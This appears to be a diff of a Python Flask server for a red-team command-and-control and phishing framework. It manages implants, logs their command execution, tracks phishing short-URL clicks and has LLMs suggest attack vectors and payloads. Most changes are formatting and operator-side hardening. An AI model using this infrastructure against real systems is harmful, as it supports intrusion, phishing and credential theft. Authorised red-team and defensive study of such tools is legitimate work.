-    max_read_bytes = 1024 * 20
-    while True:
-        socketio.sleep(0.01)
-        if app.config["fd"]:
-            timeout_sec = 0
-            (data_ready, _, _) = select.select([app.config["fd"]], [], [], timeout_sec)
-            if data_ready:
-                output = os.read(app.config["fd"], max_read_bytes).decode(errors="replace")
-                socketio.emit('output', {'data': output}, namespace='/terminal')
 
 def get_discovered_hosts():
     """
     Reads the sessions/hostsdiscovery.txt file and returns a list of discovered hosts.
     Also reads IPs from scan_discovery*.csv files in the sessions directory.
     """
-    hosts_file_path = os.path.join('sessions', 'hostsdiscovery.txt')
+    hosts_file_path = os.path.join("sessions", "hostsdiscovery.txt")
     discovered_hosts = []
     local_ips = get_local_ip_addresses()
 
     try:
-        with open(hosts_file_path, 'r') as f:
+        with open(hosts_file_path, "r") as f:
             for line in f:
                 ip_address = line.strip()
                 if ip_address and ip_address not in local_ips and ip_address not in discovered_hosts:
@@ -1657,50 +2151,52 @@ def get_discovered_hosts():
     except FileNotFoundError:
         logger.info(f"Error: File not found at {hosts_file_path}")
 
-    scan_files = glob.glob(os.path.join('sessions', 'scan_discovery*.csv'))
+    scan_files = glob.glob(os.path.join("sessions", "scan_discovery*.csv"))
     if scan_files:
         for file_path in scan_files:
             try:
-                with open(file_path, 'r') as f:
+                with open(file_path, "r") as f:
                     next(f)
                     for line in f:
                         line = line.strip()
                         if line:
-                            parts = line.split(';')
+                            parts = line.split(";")
                             if len(parts) > 0:
                                 ip_address = parts[0].strip('"')
                                 if ip_address and ip_address not in local_ips and ip_address not in discovered_hosts:
                                     discovered_hosts.append(ip_address)
             except FileNotFoundError:
                 logger.info(f"Error: Scan discovery file not found at {file_path}")
-            except Exception as e:
+            except Exception:
                 logger.info(f"Error reading scan discovery file {file_path}")
 
     return discovered_hosts
 
+
 def get_local_ip_addresses():
     local_ips = []
     try:
-        process = subprocess.run(['ip', 'addr'], capture_output=True, text=True, check=True)
+        process = subprocess.run(["ip", "addr"], capture_output=True, text=True, check=True)
         output = process.stdout
 
         for line in output.splitlines():
-            if 'inet ' in line:
+            if "inet " in line:
                 parts = line.split()
-                ip_address = parts[1].split('/')[0]
+                ip_address = parts[1].split("/")[0]
                 if ip_address != "127.0.0.1":
-                    if ('eth0' in line or 'wlan0' in line or 'tun0' in line or 'br-' in line):
+                    if "eth0" in line or "wlan0" in line or "tun0" in line or "br-" in line:
                         local_ips.append(ip_address)
-                    elif 'lo' not in line and not any(prefix in line for prefix in ['docker', 'veth']):
+                    elif "lo" not in line and not any(prefix in line for prefix in ["docker", "veth"]):
                         local_ips.append(ip_address)
 
         if not local_ips:
             return "No se pudo obtener la IP del servidor desde el sistema operativo."
         return local_ips
-    except subprocess.CalledProcessError as e:
-        return f"Error al ejecutar el comando:"
+    except subprocess.CalledProcessError:
+        return "Error al ejecutar el comando:"
     except FileNotFoundError:
         return "El comando 'ip' no se encontró en el sistema."
+
 
 def sanitize_json(data):
     """
@@ -1708,7 +2204,19 @@ def sanitize_json(data):
     Adaptar esta función según la estructura específica de tu payload.json.
     """
     if isinstance(data, dict):
-        keys_to_remove = ["c2_user", "c2_pass", "api_key", "telegram_token", "discord_token", "start_user", "start_pass", "rat_key", "email_from", "email_password", "email_username"]
+        keys_to_remove = [
+            "c2_user",
+            "c2_pass",
+            "api_key",
+            "telegram_token",
+            "discord_token",
+            "start_user",
+            "start_pass",
+            "rat_key",
+            "email_from",
+            "email_password",
+            "email_username",
+        ]
         for key in list(data.keys()):
             if key in keys_to_remove or "secret" in key.lower():
                 del data[key]
@@ -1719,21 +2227,37 @@ def sanitize_json(data):
         return [sanitize_json(item) for item in data]
     return data
 
+
 def add_dynamic_data(data):
     """
     Agrega datos dinámicos al diccionario JSON si es necesario,
     basándose en el contenido del diccionario 'data'.
+
+    Also normalises boolean fields that Go implants expect as strings.
     """
-    data['timestamp'] = 'now'
+    data["timestamp"] = "now"
+    bool_fields_for_go_implants = [
+        "enable_c2_implant_debug",
+        "enable_https",
+        "enable_toasts",
+        "enable_operator_presence",
+        "enable_cloudflare",
+    ]
+    for field in bool_fields_for_go_implants:
+        if field in data and isinstance(data[field], bool):
+            data[field] = str(data[field])
 
     return data
+
+
 def get_client_ip():
     """Get the client's IP address, handling proxies."""
     if request.headers.getlist("X-Forwarded-For"):
-        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
+        ip = request.headers.getlist("X-Forwarded-For")[0].split(",")[0].strip()
     else:
         ip = request.remote_addr
     return ip
+
 
 def get_request_details():
     """Collect comprehensive request details."""
@@ -1747,121 +2271,125 @@ def get_request_details():
     method = request.method
     path = parsed_url.path
     host = parsed_url.hostname or socket.gethostname()
-    user_agent = headers.get('User-Agent', 'Unknown')
-    referrer = headers.get('Referer', 'Unknown')
+    user_agent = headers.get("User-Agent", "Unknown")
+    referrer = headers.get("Referer", "Unknown")
     cookies = request.cookies
 
     return {
-        'id': SESSION_ID,
-        'timestamp': timestamp,
-        'method': method,
-        'url': request.url,
-        'path': path,
-        'query_string': query_string,
-        'query_params': args,
-        'form_data': form_data,
-        'json_data': json_data,
-        'client_ip': get_client_ip(),
-        'host': host,
-        'headers': headers,
-        'user_agent': user_agent,
-        'referrer': referrer,
-        'cookies': cookies
+        "id": SESSION_ID,
+        "timestamp": timestamp,
+        "method": method,
+        "url": request.url,
+        "path": path,
+        "query_string": query_string,
+        "query_params": args,
+        "form_data": form_data,
+        "json_data": json_data,
+        "client_ip": get_client_ip(),
+        "host": host,
+        "headers": headers,
+        "user_agent": user_agent,
+        "referrer": referrer,
+        "cookies": cookies,
     }
+
 
 def save_to_log(data):
     """Append request data to the JSON log file with safe permissions."""
     try:
         ensure_sessions_dir()
-        log_file = 'sessions/request_log.json'
+        log_file = "sessions/request_log.json"
         logs = []
         if os.path.exists(log_file):
-            with open(log_file, 'r') as f:
+            with open(log_file, "r") as f:
                 logs = json.load(f)
         logs.append(data)
-        temp_file = 'sessions/request_log.json.tmp'
-        with open(temp_file, 'w') as f:
+        temp_file = "sessions/request_log.json.tmp"
+        with open(temp_file, "w") as f:
             json.dump(logs, f, indent=2)
         os.rename(temp_file, log_file)
         os.chmod(log_file, stat.S_IRUSR | stat.S_IWUSR)  # 600: Owner read/write only
         logger.debug(f"Logged request with id: {data['timestamp']}")
-        return {'status': 'logged', 'id': data['timestamp']}
+        return {"status": "logged", "id": data["timestamp"]}
     except Exception as e:
         logger.error(f"Failed to save log: {e}")
-        return {'error': 'Log save failed'}, 500
+        return {"error": "Log save failed"}, 500
+
 
 def parse_access_log_for_short_url(short_url):
     """Parse access.log for entries matching the given short URL."""
     download_events = []
     log_pattern = re.compile(
-        r'(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}) - INFO - Short URL (.+?) accessed by (.+?) with (.+)'
+        r"(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}) - INFO - Short URL (.+?) accessed by (.+?) with (.+)"
     )
     try:
-        with open('sessions/access.log', 'r') as f:
+        with open("sessions/access.log", "r") as f:
             for line in f:
                 match = log_pattern.match(line.strip())
                 if match and match.group(2) == short_url:
                     timestamp, short_url, ip, user_agent = match.groups()
-                    download_events.append({
-                        'short_url': short_url,
-                        'ip': ip,
-                        'user_agent': user_agent,
-                        'timestamp': timestamp
-                    })
+                    download_events.append(
+                        {"short_url": short_url, "ip": ip, "user_agent": user_agent, "timestamp": timestamp}
+                    )
     except FileNotFoundError:
         logging.error("access.log not found")
-    except Exception as e:
+    except Exception:
         logging.error(f"Error parsing access.log: {str('')}")
     return download_events
+
 
 def parse_execution_log(implante):
     """Parse execution log for the given implante, returning execution events."""
     execution_events = []
-    log_file = os.path.join(SESSIONS_DIR, f'{implante}.log')
+    log_file = os.path.join(SESSIONS_DIR, f"{implante}.log")
     if not os.path.exists(log_file):
         logging.warning(f"Execution log not found: {log_file}")
         return execution_events
-    with open(log_file, 'r') as f:
+    with open(log_file, "r") as f:
         reader = csv.DictReader(f)
         for row in reader:
-            execution_events.append({
-                'client_id': row['client_id'],
-                'os': row['os'],
-                'pid': row['pid'],
-                'hostname': row['hostname'],
-                'ips': row['ips'],
-                'user': row['user'],
-                'command': row['command'],
-                'output': row['output'].strip(),
-                'timestamp': datetime.now().isoformat()
-            })
+            execution_events.append(
+                {
+                    "client_id": row["client_id"],
+                    "os": row["os"],
+                    "pid": row["pid"],
+                    "hostname": row["hostname"],
+                    "ips": row["ips"],
+                    "user": row["user"],
+                    "command": row["command"],
+                    "output": row["output"].strip(),
+                    "timestamp": datetime.now().isoformat(),
+                }
+            )
     return execution_events
+
 
 def load_implant_config(implante):
     """Load implant configuration from JSON file."""
-    config_file = os.path.join(SESSIONS_DIR, f'implant_config_{implante}.json')
+    config_file = os.path.join(SESSIONS_DIR, f"implant_config_{implante}.json")
     if not os.path.exists(config_file):
         logging.warning(f"Implant config not found: {config_file}")
         return {}
-    with open(config_file, 'r') as f:
+    with open(config_file, "r") as f:
         return json.load(f)
+
 
 def load_short_urls():
     """Load short URLs from JSON file, creating it if it doesn't exist."""
     if not os.path.exists(SHORT_URLS_FILE):
         try:
-            with open(SHORT_URLS_FILE, 'w') as f:
+            with open(SHORT_URLS_FILE, "w") as f:
                 json.dump({}, f)
-        except Exception as e:
+        except Exception:
             logging.error(f"Failed to create short_urls.json: {str('')}")
             raise
     try:
-        with open(SHORT_URLS_FILE, 'r') as f:
+        with open(SHORT_URLS_FILE, "r") as f:
             return json.load(f)
-    except json.JSONDecodeError as e:
+    except json.JSONDecodeError:
         logging.error(f"Failed to parse short_urls.json: {str('')}")
         return {}
-    except Exception as e:
+    except Exception:
         logging.error(f"Error reading short_urls.json: {str('')}")
         raise
 
@@ -1869,19 +2397,19 @@ def load_short_urls():
 def save_short_urls(data):
     """Save short URLs to JSON file."""
     try:
-        with open(SHORT_URLS_FILE, 'w') as f:
+        with open(SHORT_URLS_FILE, "w") as f:
             json.dump(data, f, indent=2)
-    except Exception as e:
+    except Exception:
         logging.error(f"Failed to save short_urls.json: {str('')}")
         raise
 
+
 def is_valid_url(url):
     """Validate if the input is a valid URL or existing local file path."""
-    import os
-    import validators
-    from urllib.parse import urlparse
     import logging
-    
+    import os
+    from urllib.parse import urlparse
+
     ALLOWED_BASE_DIR = os.path.abspath("./sessions")  # directorio seguro
 
     def get_safe_file_path(user_path):
@@ -1891,16 +2419,16 @@ def is_valid_url(url):
         """
         try:
             # Si es una URL file://, extraer solo la parte del path
-            if user_path.startswith('file://'):
+            if user_path.startswith("file://"):
                 user_path = user_path[7:]  # Remover 'file://'
-            
+
             # Normalizar el path para resolver .. y .
             normalized_path = os.path.normpath(user_path)
-            
+
             # Convertir a path absoluto
             abs_user_path = os.path.abspath(normalized_path)
             abs_allowed_dir = os.path.abspath(ALLOWED_BASE_DIR)
-            
+
             # Verificar que el path esté dentro del directorio permitido
             # Usar os.path.commonpath para una verificación más robusta
             try:
@@ -1912,14 +2440,14 @@ def is_valid_url(url):
                 # commonpath falla si las rutas están en diferentes drives (Windows)
                 logging.warning(f"Invalid path structure: {abs_user_path}")
                 return None
-            
+
             # Verificación adicional: el path debe empezar con el directorio permitido
             if not abs_user_path.startswith(abs_allowed_dir + os.sep):
                 logging.warning(f"Path not within allowed directory: {abs_user_path}")
                 return None
-                
+
             return abs_user_path
-            
+
         except Exception as e:
             logging.error(f"Error processing file path: {e}")
             return None
@@ -1931,17 +2459,17 @@ def is_valid_url(url):
 
     # Procesar como posible archivo local
     parsed_url = urlparse(url)
-    
-    if parsed_url.scheme == 'file' or not parsed_url.scheme:
+
+    if parsed_url.scheme == "file" or not parsed_url.scheme:
         # Extraer el path del archivo
-        file_path = parsed_url.path if parsed_url.scheme == 'file' else url
-        
+        file_path = parsed_url.path if parsed_url.scheme == "file" else url
+
         # Obtener path seguro
         safe_file_path = get_safe_file_path(file_path)
         if not safe_file_path:
             logging.warning(f"Access denied: {file_path} is outside allowed directory or invalid.")
             return False
-        
+
         # Ahora usar el path seguro (no el del usuario) para verificar existencia
         if os.path.exists(safe_file_path) and os.path.isfile(safe_file_path):
             logging.info(f"Valid local file: {safe_file_path}")
@@ -1953,38 +2481,38 @@ def is_valid_url(url):
     logging.warning(f"Invalid URL or file path: {url}")
     return False
 
+
 def analyze_behavioral_data(behavioral_events):
     """Analyze behavioral events using Groq AI to generate risk scores."""
-    client = _safe_groq_client(GROQ_API_KEY)
-    if client is None:
+    groq_client = safe_groq_client(GROQ_API_KEY)
+    if groq_client is None:
         return []
     analysis_results = []
     for event in behavioral_events:
         prompt = f"""
         Analyze the following user interaction:
-        - Event: {event['event_type']}
-        - IP: {event['ip']}
-        - User Agent: {event['user_agent']}
-        - Behavior Data: {event['behavior_data']}
-        - Timestamp: {event['timestamp']}
+        - Event: {event["event_type"]}
+        - IP: {event["ip"]}
+        - User Agent: {event["user_agent"]}
+        - Behavior Data: {event["behavior_data"]}
+        - Timestamp: {event["timestamp"]}
         Determine a risk score (0-100) based on suspicious behavior (e.g., rapid clicks, unusual IPs).
         """
-        response = client.chat.completions.create(
-            model="llama3-70b-8192",
-            messages=[{"role": "user", "content": prompt}],
-            max_tokens=100
+        response = groq_client.chat.completions.create(
+            model="llama3-70b-8192", messages=[{"role": "user", "content": prompt}], max_tokens=100
         )
-        risk_score = int(response.choices[0].message.content.strip()) if response.choices[0].message.content.strip().isdigit() else 50
-        analysis_results.append({
-            'email': event['email'],
-            'event_type': event['event_type'],
-            'risk_score': risk_score
-        })
+        risk_score = (
+            int(response.choices[0].message.content.strip())
+            if response.choices[0].message.content.strip().isdigit()
+            else 50
+        )
+        analysis_results.append({"email": event["email"], "event_type": event["event_type"], "risk_score": risk_score})
     return analysis_results
+
 
 def analyze_campaign_progress(campaign_id, events):
     """Analyze campaign progress and suggest adaptations using Grok AI."""
-    client = _safe_groq_client(GROQ_API_KEY)
+    client = safe_groq_client(GROQ_API_KEY)
     if client is None:
         return {}
     prompt = f"""
@@ -1995,41 +2523,163 @@ def analyze_campaign_progress(campaign_id, events):
     Return JSON: ```json{{ "vector": str, "payload": str, "short_url": str }}```
     """
     response = client.chat.completions.create(
-        model="llama3-70b-8192",
-        messages=[{"role": "user", "content": prompt}],
-        max_tokens=200
+        model="llama3-70b-8192", messages=[{"role": "user", "content": prompt}], max_tokens=200
     )
-    if config.enable_c2_debug == True:
+    if config.enable_c2_debug:
         print(response.choices[0].message.content)
     return json.loads(clean_json(response.choices[0].message.content.strip()))
+
 
 SAVE_DIR = "sessions/captured_images"
 if not os.path.exists(SAVE_DIR):
     os.makedirs(SAVE_DIR)
 
 
-app = Flask(__name__, static_folder='static')
+app = Flask(__name__, static_folder="static")
 
 limiter = Limiter(
     app=app,
     key_func=get_remote_address,
-    default_limits=[config.c2_daily_limit, config.c2_hour_limit]
+    default_limits=[
+        config.c2_daily_limit or "1000 per day",
+        config.c2_hour_limit or "200 per hour",
+    ],
 )
+
 
 @app.before_request
 def _metrics_before_request():
-    if request.endpoint and not request.path.startswith('/metrics'):
-        REGISTRY.inc('c2_requests_total',
-                     labels={'method': request.method, 'endpoint': request.endpoint})
+    if request.endpoint and not request.path.startswith("/metrics"):
+        REGISTRY.inc("c2_requests_total", labels={"method": request.method, "endpoint": request.endpoint})
+
+
+@app.before_request
+def _enforce_https_redirect():
+    """Force HTTP -> HTTPS in PROD when the policy says so.
+
+    Returns:
+        A redirect response when the policy decides the request must be
+        upgraded; otherwise ``None`` so Flask continues handling it.
+    """
+    return _https_redirect_policy.evaluate(request)
+
+
+_PASSWORD_CHANGE_EXEMPT_ENDPOINTS = {
+    "change_password",
+    "logout",
+    "mfa_verify",
+    "static",
+    "mfa_setup",
+}
+
+
+@app.before_request
+def _enforce_password_rotation():
+    """Redirect users flagged with ``must_change_password`` to the
+    rotation form until they set a strong password."""
+    if not current_user.is_authenticated:
+        return None
+    if request.endpoint in _PASSWORD_CHANGE_EXEMPT_ENDPOINTS:
+        return None
+    flagged = False
+    if _RBAC_AVAILABLE:
+        rbac_user = _get_rbac_user_obj(current_user)
+        flagged = bool(rbac_user and rbac_user.must_change_password)
+    else:
+        user_data = next(
+            (u for u in load_users() if u["username"] == current_user.username),
+            None,
+        )
+        flagged = bool(user_data and user_data.get("must_change_password"))
+    if flagged:
+        return redirect(url_for("change_password"))
+    return None
+
+
+_MFA_EXEMPT_ENDPOINT_SUFFIXES = (
+    "login",
+    "mfa_verify",
+    "logout",
+    "change_password",
+    "static",
+)
+
+
+def _mfa_exempt_endpoint(endpoint):
+    if not endpoint:
+        return True
+    short = endpoint.split(".")[-1]
+    return short in _MFA_EXEMPT_ENDPOINT_SUFFIXES
+
+
+def _mfa_challenge_pending():
+    """Check whether the current session still owes MFA verification.
+
+    Returns:
+        True when an MFA-enabled RBAC user is authenticated without a
+        completed second factor.
+    """
+    if not current_user.is_authenticated:
+        return False
+    if session.get("mfa_verified"):
+        return False
+    rbac_user = _get_rbac_user_obj(current_user)
+    if not rbac_user:
+        return False
+    return bool(rbac_user.mfa_enabled)
+
+
+@app.before_request
+def _enforce_mfa_verified():
+    """Block password-only sessions from reaching privileged views."""
+    if not _RBAC_AVAILABLE:
+        return None
+    if _mfa_exempt_endpoint(request.endpoint):
+        return None
+    if _mfa_challenge_pending():
+        session["mfa_pending_route"] = request.path
+        return redirect(url_for("mfa_verify"))
+    return None
+
+
+def require_mfa_socket(f):
+    """Socket.IO-compatible MFA guard for command/control namespaces.
+
+    Denies pending-MFA sessions that satisfy ``login_required`` but have
+    not completed the second factor.
+    """
+
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if not current_user.is_authenticated:
+            disconnect()
+            return False
+        if _mfa_challenge_pending():
+            emit("error", {"error": "MFA verification required"})
+            disconnect()
+            return False
+        return f(*args, **kwargs)
+
+    return decorated
 
 
 @app.after_request
 def _add_security_headers(response):
-    response.headers['X-Content-Type-Options'] = 'nosniff'
-    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
-    response.headers['X-XSS-Protection'] = '1; mode=block'
-    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
+    response.headers["X-Content-Type-Options"] = "nosniff"
+    response.headers["X-Frame-Options"] = "SAMEORIGIN"
+    response.headers["X-XSS-Protection"] = "1; mode=block"
+    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+    response.headers["Content-Security-Policy"] = (
+        "default-src 'self'; img-src 'self' data: https://upload.wikimedia.org; "
+        "style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; "
+        "script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com "
+        "https://unpkg.com https://cdn.jsdelivr.net; "
+        "script-src-elem 'self' 'unsafe-inline' https://cdnjs.cloudflare.com "
+        "https://unpkg.com https://cdn.jsdelivr.net; "
+        "connect-src 'self'"
+    )
     return response
+
 
 SESSION_ID = str(uuid.uuid4())
 
@@ -2052,34 +2702,150 @@ def _load_or_create_secret_key():
     if env_key:
         return env_key
     ensure_sessions_dir()
-    return _SecretKeyManager(Path('sessions')).get_or_create()
+    return _SecretKeyManager(Path("sessions")).get_or_create()
 
 
 app.secret_key = _load_or_create_secret_key() + SESSION_ID
-app.config['SECRET_KEY'] = app.secret_key
-app.config['SESSION_COOKIE_SECURE'] = True
-app.config['SESSION_COOKIE_HTTPONLY'] = True
-app.config['REMEMBER_COOKIE_SECURE'] = True
-app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+app.config["SECRET_KEY"] = app.secret_key
+app.config["SESSION_COOKIE_SECURE"] = True
+app.config["SESSION_COOKIE_HTTPONLY"] = True
+app.config["REMEMBER_COOKIE_SECURE"] = True
+app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
+app.config["PROPAGATE_EXCEPTIONS"] = False
+app.config["TRAP_HTTP_EXCEPTIONS"] = True
 app.config["fd"] = None
 app.config["child_pid"] = None
-app.jinja_env.filters['fromjson'] = fromjson
-app.jinja_env.filters['markdown'] = markdown_to_html
+try:
+    app.config["RBAC_AVAILABLE"] = _RBAC_AVAILABLE
+    app.config["ROLE_DEFAULT"] = ROLE_DEFAULT
+    app.config["MFA_ISSUER"] = MFA_ISSUER
+except NameError:
+    pass
+app.jinja_env.filters["fromjson"] = fromjson
+app.jinja_env.filters["markdown"] = markdown_to_html
 BASE_DIR = os.getcwd()
-TOOLS_DIR = f'{BASE_DIR}/tools'
+TOOLS_DIR = f"{BASE_DIR}/tools"
+LAZYADDONS_DIR = os.path.join(BASE_DIR, "lazyaddons")
+app.config.setdefault("LAZYOWN_ADDONS_DIR", LAZYADDONS_DIR)
+app.config.setdefault("lhost", str(getattr(config, "lhost", "127.0.0.1")))
+
+
+@app.errorhandler(404)
+def _handle_404(_error):
+    return jsonify({"error": "not found"}), 404
+
+
+@app.errorhandler(405)
+def _handle_405(_error):
+    return jsonify({"error": "method not allowed"}), 405
+
+
+@app.errorhandler(Exception)
+def _handle_exception(error):
+    """Generic error handler that never leaks stack traces or exception messages.
+
+    Even when ``config.enable_c2_debug`` is on, the response body stays
+    generic. Verbose details are still logged server-side for operators.
+    HTTP exceptions (429 rate limits, 404s, ...) keep their real status
+    codes instead of being masked as 500s.
+    """
+    try:
+        from werkzeug.exceptions import HTTPException as _HTTPException
+
+        if isinstance(error, _HTTPException):
+            return error
+    except ImportError:
+        pass
+    if config.enable_c2_debug:
+        logger.exception("[c2] unhandled exception: %s", error)
+    return jsonify({"error": "internal server error"}), 500
+
+
 BASE_DIR += "/sessions/"
-UPLOAD_FOLDER = BASE_DIR + 'uploads'
-app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+UPLOAD_FOLDER = BASE_DIR + "uploads"
+app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
+app.config["MAX_CONTENT_LENGTH"] = int(getattr(config, "c2_max_upload_size_mb", 10) or 10) * 1024 * 1024
+app.config["SESSIONS_DIR"] = os.path.realpath(BASE_DIR)
 ALLOWED_DIRECTORY = BASE_DIR
 MODEL = retModel()
 
 
-shell = LazyOwnShell()
+_shell_instance = None
+_shell_lock = threading.Lock()
 
-shell.stdout = StringIO()
-shell.onecmd('p')
-shell.onecmd('create_session_json')
-JSON_FILE_PATH_REPORT = 'static/body_report.json'
+
+def _init_shell():
+    """Create the shared CLI shell on first use (double-checked lock).
+
+    The import of ``lazyown`` stays inside this function so importing
+    this module never pulls the CLI tree. The boot sequence matches
+    the historic eager startup: StringIO stdout plus the ``p`` and
+    ``create_session_json`` commands.
+
+    Returns:
+        The shared LazyOwnShell instance.
+    """
+    global _shell_instance
+    if _shell_instance is not None:
+        return _shell_instance
+    with _shell_lock:
+        if _shell_instance is not None:
+            return _shell_instance
+        from lazyown import LazyOwnShell
+
+        created = LazyOwnShell()
+        created.stdout = StringIO()
+        created.onecmd("p")
+        created.onecmd("create_session_json")
+        _shell_instance = created
+        return _shell_instance
+
+
+def __getattr__(name):
+    """Serve the lazily created ``shell`` attribute (PEP 562).
+
+    Only used when this file is imported as a module. When executed
+    as a script, in-module reads go through the ``shell`` proxy below.
+
+    Args:
+        name: Requested module attribute name.
+
+    Returns:
+        The shared shell for ``shell``.
+
+    Raises:
+        AttributeError: For any other missing attribute.
+    """
+    if name == "shell":
+        return _init_shell()
+    raise AttributeError(f"module {__name__!r} has no attribute {name!r}")
+
+
+class _LazyShellProxy:
+    """Stand-in for the shared CLI shell until first real use.
+
+    Attribute reads and writes forward to the lazily created shell,
+    so every existing ``shell.*`` call site works unchanged while
+    module load no longer builds the CLI tree.
+    """
+
+    def _target(self):
+        """Return the shared shell, creating it on first use."""
+        return _init_shell()
+
+    def __getattr__(self, name):
+        """Forward attribute reads to the shared shell."""
+        return getattr(self._target(), name)
+
+    def __setattr__(self, name, value):
+        """Forward attribute writes to the shared shell."""
+        setattr(self._target(), name, value)
+
+
+shell = _LazyShellProxy()
+
+
+JSON_FILE_PATH_REPORT = "static/body_report.json"
 implants = {"implants": []}
 commands = {}
 results = {}
@@ -2087,32 +2853,154 @@ commands_history = {}
 remote_commands_history = {}
 connected_clients = set()
 path = os.getcwd()
-atomic_framework_path = f'{path}/external/.exploit/atomic-red-team/atomics'
+atomic_framework_path = f"{path}/external/.exploit/atomic-red-team/atomics"
 events = []
 counter_events = 0
 
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', transports=['websocket'])
-listener_manager = ListenerManager(app, sessions_dir='sessions', payload=_payload_snapshot)
+socketio = SocketIO(
+    app, cors_allowed_origins=_cors_policy.origins_for_socketio(), async_mode="threading", transports=["websocket"]
+)
+listener_manager = ListenerManager(app, sessions_dir="sessions", payload=_payload_snapshot)
+app.config["listener_manager"] = listener_manager
 login_manager = LoginManager(app)
-login_manager.login_view = 'login'
-USER_DATA_PATH = 'users.json'
-ENV = "PROD"
-DATA_FILE = BASE_DIR + 'surface_attack.json'
-LOG_DIR = os.path.join('sessions', 'logs', 'c2')
-LOG_FILE = os.path.join(LOG_DIR, 'log_c2.txt')
-CAMPAIGNS_DIR = os.path.join(os.getcwd(), 'sessions', 'phishing', 'campaigns')
-TEMPLATES_DIR = os.path.join(os.getcwd(), 'templates', 'phishing', 'emails')
-DB_PATH = os.path.join(os.getcwd(), 'sessions', 'phishing', 'tracking.db')
+login_manager.login_view = "login"
+USER_DATA_PATH = "users.json"
+ENV = _env_tag()
+
+
+def _persist_bootstrap_password(prefix: str, password: str) -> None:
+    """Persist the one-time admin password to an owner-only file.
+
+    Writes the credential to ``sessions/<prefix>_initial_admin.txt`` with
+    restrictive permissions instead of echoing it to the console, which may
+    be captured by terminal scrollback or process logging.
+
+    Args:
+        prefix: Logging/identifier prefix (``rbac`` or ``users``).
+        password: The one-time admin password to persist.
+    """
+    ensure_sessions_dir()
+    path = Path("sessions") / f"{prefix}_initial_admin.txt"
+    path.write_text(f"admin / {password}\n", encoding="utf-8")
+    os.chmod(path, stat.S_IRUSR | stat.S_IWUSR)
+    logger.info("[%s] Initial admin password persisted to %s", prefix, path)
+    print(f"[{prefix}] Initial admin created; password written to: {path}")
+    print(f"[{prefix}] You will be forced to change it on first login.")
+
+
+def _bootstrap_initial_admin() -> None:
+    """Create the initial admin account only on a truly fresh install.
+
+    A cryptographically random one-time password is generated and printed
+    exactly once; the account is flagged with ``must_change_password`` so
+    the operator is forced to rotate it on first login.
+
+    If ``users.json`` exists but is empty or unreadable, the store is left
+    untouched: overwriting an existing operator database is never acceptable.
+    """
+    one_time_password = secrets.token_urlsafe(16)
+    if _RBAC_AVAILABLE:
+        store_path = Path(USER_DATA_PATH)
+        if store_path.exists():
+            try:
+                existing = _rbac_store.load_all()
+            except Exception as exc:
+                logger.critical(
+                    "[rbac] users.json exists but is unreadable; refusing to overwrite it: %s",
+                    exc,
+                )
+                print("[rbac] WARNING: users.json exists but could not be read. It will NOT be overwritten.")
+                return
+            if not existing:
+                logger.critical(
+                    "[rbac] users.json exists but is empty; refusing to overwrite it with a bootstrap admin"
+                )
+                print("[rbac] WARNING: users.json exists but is empty. It will NOT be overwritten.")
+            else:
+                _migrated = False
+                for u in existing:
+                    if not u.role or u.role not in Role.valid_roles():
+                        u.role = ROLE_DEFAULT
+                        _rbac_store.save(u)
+                        _migrated = True
+                if _migrated:
+                    logger.info("[rbac] Migrated existing users to RBAC schema")
+                _rbac_store.ensure_admin("admin", generate_password_hash(one_time_password))
+            return
+        logger.info("[rbac] No users.json found; creating initial admin account")
+        admin = _rbac_store.ensure_admin(
+            username="admin",
+            password_hash=generate_password_hash(one_time_password),
+        )
+        admin.must_change_password = True
+        _rbac_store.save(admin)
+        _persist_bootstrap_password("rbac", one_time_password)
+        return
+    from lazyc2.extensions.users import load_users, save_users
+
+    if load_users():
+        return
+    if Path(USER_DATA_PATH).exists():
+        logger.critical(
+            "[users] users.json exists but is empty or unreadable; refusing to overwrite it with a bootstrap admin"
+        )
+        return
+    logger.info("[users] No users found; creating initial admin account")
+    save_users(
+        [
+            {
+                "id": 1,
+                "username": "admin",
+                "password_hash": generate_password_hash(one_time_password),
+                "role": "admin",
+                "mfa_enabled": False,
+                "mfa_secret": "",
+                "recovery_codes": [],
+                "tenant_id": "default",
+                "must_change_password": True,
+            }
+        ]
+    )
+    _persist_bootstrap_password("users", one_time_password)
+
+
+if _RBAC_AVAILABLE:
+    _rbac_store = RBACStore(USER_DATA_PATH)
+    set_rbac_store(_rbac_store)
+    _tenant_mgr = TenantManager()
+    set_tenant_manager(_tenant_mgr)
+    _tenant_mgr.ensure_default_tenant()
+
+_RUN_MAIN = __name__ == "__main__"
+
+if _RUN_MAIN:
+    _bootstrap_initial_admin()
+
+DATA_FILE = BASE_DIR + "surface_attack.json"
+LOG_DIR = os.path.join("sessions", "logs", "c2")
+LOG_FILE = os.path.join(LOG_DIR, "log_c2.txt")
+CAMPAIGNS_DIR = os.path.join(os.getcwd(), "sessions", "phishing", "campaigns")
+TEMPLATES_DIR = os.path.join(os.getcwd(), "templates", "phishing", "emails")
+DB_PATH = os.path.join(os.getcwd(), "sessions", "phishing", "tracking.db")
 GMAIL_ADDRESS = config.email_username
 GMAIL_APP_PASSWORD = config.email_password
-SESSIONS_PHISHING_DIR = os.path.join(os.getcwd(), 'sessions', 'phishing', 'campaigns')
-SHORT_URLS_FILE = SESSIONS_PHISHING_DIR + '/short_urls.json'
-SESSIONS_DIR = os.path.join(os.getcwd(), 'sessions')
+SESSIONS_PHISHING_DIR = os.path.join(os.getcwd(), "sessions", "phishing", "campaigns")
+SHORT_URLS_FILE = SESSIONS_PHISHING_DIR + "/short_urls.json"
+SESSIONS_DIR = os.path.join(os.getcwd(), "sessions")
+if _RBAC_AVAILABLE:
+    _tm = get_tenant_manager()
+    _active_tenant_sessions = _tm.get_active_sessions_dir()
+    if _active_tenant_sessions and _active_tenant_sessions != "sessions":
